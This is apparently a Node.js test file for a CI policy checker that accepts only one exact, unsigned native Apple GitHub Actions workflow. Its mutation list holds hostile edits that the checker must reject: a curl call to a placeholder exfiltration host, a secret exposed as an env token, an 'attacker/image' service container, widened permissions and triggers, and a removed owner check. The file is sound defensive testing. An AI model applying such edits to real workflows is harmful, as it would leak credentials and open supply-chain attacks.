import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { isExactNativeAppleWorkflow, validateNativeAppleWorkflow } from './native-apple-workflow-policy.mjs';
import { validateRunnerLabels } from './workflow-runner-labels.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const approved = fs.readFileSync(
  path.join(root, '.github', 'scripts', 'fixtures', 'native-apple-check.yml'),
  'utf8',
);

test('accepts only the exact unsigned native Apple workflow under its reserved name', () => {
  assert.equal(isExactNativeAppleWorkflow(approved, 'native-apple-check.yml'), true);
  assert.deepEqual(validateNativeAppleWorkflow(approved, 'native-apple-check.yml'), []);
  assert.deepEqual(validateRunnerLabels(approved, 'native-apple-check.yml'), []);
  assert.equal(isExactNativeAppleWorkflow(approved, 'other.yml'), false);
  assert.equal(validateRunnerLabels(approved, 'other.yml').length, 1);
});

test('rejects privileged, broadened, mutable and injected native Apple workflows', () => {
  const mutations = [
    ['contents: read', 'contents: write'],
    ['contents: read', 'contents: read\n  id-token: write'],
    ['    timeout-minutes: 30', '    environment: production\n    timeout-minutes: 30'],
    ['    timeout-minutes: 30', '    env:\n      TOKEN: ${{ secrets.APPLE_KEY }}\n    timeout-minutes: 30'],
    ['  workflow_dispatch:', '  push:\n  workflow_dispatch:'],
    ['  workflow_dispatch:', '  pull_request_target:\n  workflow_dispatch:'],
    ['  workflow_dispatch:', '  workflow_call:\n  workflow_dispatch:'],
    ['runs-on: macos-15', 'runs-on: macos-latest'],
    ['runs-on: macos-15', 'runs-on: macos-15-large'],
    ['runs-on: macos-15', 'runs-on: ${{ inputs.runner }}'],
    ['runs-on: macos-15', '"runs-on": macos-15'],
    ['persist-credentials: false', 'persist-credentials: true'],
    ['ref: ${{ inputs.candidate_sha }}', 'ref: main'],
    ['^[0-9a-f]{40}$', '.*'],
    [" && github.actor == github.repository_owner", ''],
    ['CODE_SIGNING_ALLOWED=NO', 'CODE_SIGNING_ALLOWED=YES'],
    ['swift test --package-path apps/apple/CertigoKit', 'curl https://example.invalid/exfiltrate'],
    ['    steps:', '    services:\n      helper:\n        image: attacker/image\n    steps:'],
    ['            build', '            archive'],
  ];
  for (const [before, after] of mutations) {
    assert.ok(approved.includes(before), before);
    const candidate = approved.replace(before, after);
    assert.equal(isExactNativeAppleWorkflow(candidate, 'native-apple-check.yml'), false, after);
    assert.equal(validateRunnerLabels(candidate, 'native-apple-check.yml').length, 1, after);
  }
  assert.equal(validateRunnerLabels(`${approved}\nextra: &a [*a]\n`, 'native-apple-check.yml').length, 1);
  assert.equal(validateRunnerLabels(approved.replaceAll('\n', '\r\n'), 'native-apple-check.yml').length, 1);
});
